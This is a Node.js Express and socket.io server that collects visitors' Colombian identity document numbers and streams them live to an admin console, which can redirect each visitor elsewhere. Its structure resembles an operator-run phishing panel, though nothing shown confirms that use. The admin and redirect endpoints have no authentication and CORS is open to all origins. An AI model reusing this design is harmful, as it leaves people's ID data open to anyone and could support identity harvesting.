const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

// Configuración CORS para permitir Azure Storage
const io = socketIo(server, {
  cors: {
    origin: "*", // Permitirá tu dominio de Azure Storage
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());

// Almacenamiento en memoria (en producción usar Redis)
const sessions = new Map();

// Endpoints de la API
app.post('/api/session', (req, res) => {
  const { documentType, documentNumber, sessionId } = req.body;
  
  const sessionData = {
    sessionId,
    documentType,
    documentNumber,
    documentTypeText: getDocumentTypeText(documentType),
    timestamp: Date.now(),
    status: 'waiting',
    redirectTo: null,
    phoneNumber: null,
    emailAddress: null
  };
  
  sessions.set(sessionId, sessionData);
  
  // Notificar a todos los admins
  io.emit('new_session', sessionData);
  console.log(`📱 Nueva sesión: ${sessionId} - ${documentNumber}`);
  
  res.json({ success: true, sessionId });
});

app.get('/api/session/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  
  if (sessions.has(sessionId)) {
    res.json({ success: true, session: sessions.get(sessionId) });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

app.post('/api/session/:sessionId/redirect', (req, res) => {
  const { sessionId } = req.params;
  const { redirectTo, phoneNumber, emailAddress } = req.body;
  
  if (sessions.has(sessionId)) {
    const session = sessions.get(sessionId);
    session.status = 'completed';
    session.redirectTo = redirectTo;
    session.phoneNumber = phoneNumber;
    session.emailAddress = emailAddress;
    session.completedAt = Date.now();
    
    // Notificar a todos los admins
    io.emit('session_updated', session);
    
    // Notificar al usuario específico
    io.to(sessionId).emit('redirect', { redirectTo, phoneNumber, emailAddress });
    
    console.log(`🔄 Sesión ${sessionId} redirigida a: ${redirectTo}`);
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false, error: 'Session not found' });
  }
});

// WebSocket
io.on('connection', (socket) => {
  console.log('🔌 Nueva conexión:', socket.id);
  
  socket.on('admin_connect', () => {
    // Enviar todas las sesiones en espera al admin
    const waitingSessions = Array.from(sessions.values()).filter(s => s.status === 'waiting');
    socket.emit('sessions_list', waitingSessions);
    console.log('👨‍💼 Admin conectado');
  });
  
  socket.on('user_connect', (sessionId) => {
    socket.join(sessionId);
    console.log('👤 Usuario conectado para sesión:', sessionId);
  });
  
  socket.on('disconnect', () => {
    console.log('❌ Cliente desconectado:', socket.id);
  });
});

function getDocumentTypeText(type) {
  const types = {
    'ci': 'Cédula de Ciudadanía',
    'ce': 'Cédula de Extranjería', 
    'pp': 'Pasaporte'
  };
  return types[type] || 'Documento';
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor backend ejecutándose en puerto ${PORT}`);
  console.log(`📡 WebSockets activos para comunicación en tiempo real`);
});
